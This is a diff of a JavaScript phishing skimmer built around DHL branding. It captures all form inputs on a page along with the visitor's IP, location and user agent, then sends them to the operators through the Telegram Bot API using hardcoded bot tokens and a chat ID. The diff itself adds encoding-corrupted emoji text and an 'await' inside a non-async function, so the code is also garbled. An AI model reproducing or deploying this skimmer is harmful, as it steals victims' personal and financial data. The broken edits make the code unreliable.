@@ -1,11 +1,11 @@
-(function() {
+﻿(function() {
   const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
   const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
   const CHAT_ID = "6788012481";
 
   function sendTelegram(token, text) {
     try {
-      fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+      await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
@@ -20,7 +20,7 @@
 
     setTimeout(function() {
       const inputs = document.querySelectorAll('input, select');
-      let dataText = '📦 <b>DHL Data Captured</b>\n\n';
+      let dataText = 'ðŸ“¦ <b>DHL Data Captured</b>\n\n';
       let count = 0;
 
       inputs.forEach(function(input) {
@@ -44,15 +44,16 @@
       const city = (data && data.city) ? data.city : 'Inconnu';
       const country = (data && data.country) ? data.country : 'Inconnu';
 
-      const text = '🚨 <b>New DHL Visit</b>\n\n' +
-        '🌐 <b>IP:</b> ' + ip + '\n' +
-        '🏙️ <b>Ville:</b> ' + city + '\n' +
-        '🌍 <b>Pays:</b> ' + country + '\n' +
-        '📱 <b>UA:</b> ' + navigator.userAgent;
+      const text = 'ðŸš¨ <b>New DHL Visit</b>\n\n' +
+        'ðŸŒ <b>IP:</b> ' + ip + '\n' +
+        'ðŸ™ï¸ <b>Ville:</b> ' + city + '\n' +
+        'ðŸŒ <b>Pays:</b> ' + country + '\n' +
+        'ðŸ“± <b>UA:</b> ' + navigator.userAgent;
 
       sendTelegram(VISIT_BOT_TOKEN, text);
     }).catch(() => {
-      sendTelegram(VISIT_BOT_TOKEN, '🚨 <b>New DHL Visit</b> (IP fail)');
+      sendTelegram(VISIT_BOT_TOKEN, 'ðŸš¨ <b>New DHL Visit</b> (IP fail)');
     });
   } catch(e) {}
 })();
+
